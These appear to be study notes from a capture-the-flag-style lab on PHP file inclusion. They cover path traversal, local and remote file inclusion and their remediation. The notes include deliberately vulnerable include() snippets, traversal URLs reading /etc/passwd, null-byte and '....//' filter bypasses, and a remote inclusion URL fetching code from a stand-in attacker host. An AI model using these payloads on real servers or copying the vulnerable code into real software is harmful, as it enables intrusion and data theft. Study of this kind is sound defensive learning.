RFI

File Inclusion vulnerability happens when a user can retrieve or execute command of their own because the input to the file is not sanitized properly, mostly in PHP. They could retrieve sensitive files or even perform remote code execution.

Path Traversal

The function in php that causes this vulnerability is file_get_contents, if the input is not sanitized properly.

http://webapp.thm/get.php?file=/var/www/app/CVs/userCV.pdf - normal input
http://webapp.thm/get.php?file=../../../../etc/passwd - path traversal or dot dot dash attack.

If the server is windows based then the file to retrieve is window.ini or boot.ini.

http://webapp.thm/get.php?file=../../../../boot.ini
http://webapp.thm/get.php?file=../../../../windows/win.ini

LFI

When developer includes these functions without security awareness,

include
require
include_once
require-once
<?PHP 
	include($_GET["lang"]);
?>
http://webapp.thm/index.php?lang=EN.php - To load english page
http://webapp.thm/index.php?lang=AR.php - To load arabic page

This php includes file based on the language that is requested.

http://webapp.thm/get.php?file=/etc/passwd

This works because there is no directory mentioned in the include and no input validation.

<?PHP 
	include("languages/". $_GET['lang']); 
?>

Now the developer has added the directory to be fetched from, here we could use path traversal to read etc/passwd.

http://webapp.thm/index.php?lang=../../../../etc/passwd

Sometimes the developer specifies in the include that adds .php to the input and retrieves the file accordingly.

http://webapp.thm/index.php?lang=EN 
here the index.php has a include fucntion that retrieves EN.php

So just giving the file name will not retrieve the required file here, we have to negate the .php addition to our input so we inject null byte at the end %00.

The %00 trich is fixed and not working with PHP 5.3.4 and above.

some %00 will be encoded in the brower and the .php will not be negated, edit the url directly.

Now the next trick of defense is the developer has decide to filter keywords that restricts the retrieval of sensitive information. Now to trick the code we give /etc/passwd/. , this does not get filtered out and . means it will be there in the same directory, .. means one directory before.

In the next level of defense the developer filters out ../ so now we change the payload that avoids this filter.

....//....//....//....//etc/passwd - Each ../ gets removed and we are left with
../../../../etc/passwd

Why this works? Because in php only the strings that match the format are removed and the rest are left out.

Sometimes the developer specifies the directory in which it reads file in the payload. To negate this the payload looks like

?lang=language/../../../../../etc/paswd

Remote File Inclusion RFI

RFI is a technique to include remote files into a vulnerable application. It allows the user to inject external URL into include function. allow_url_fopen option being on is a requirement for RFI.

The risk of RFI is higher than LFI because it allows remote code execution on the server.

http://webapp.thm/get.php?file=http://attacker.thm/cmd.txt 
- happens when allow_url_fopen option is on.
The web application executes the php code inside the cmd.txt file 
from the malicious server.
<?PHP echo "Hello THM"; ?>
hence Hello THM is printed.

Remediation

  • Keep system and services, including web application frameworks with updated version.
  • Turn off PHP errors, to prevent revealing sensitive information.
  • Use WAF (Web Application Firewall) to prevent web application attacks.
  • Disable some PHP features that cause file inclusion like allow_url_fopen and allow_url_include.
  • Allow only protocols and PHP wrappers that are in need.
  • Never trust user input and perform input validation against file inclusion.
  • Implement whitelisting & blacklisting for file names and location.
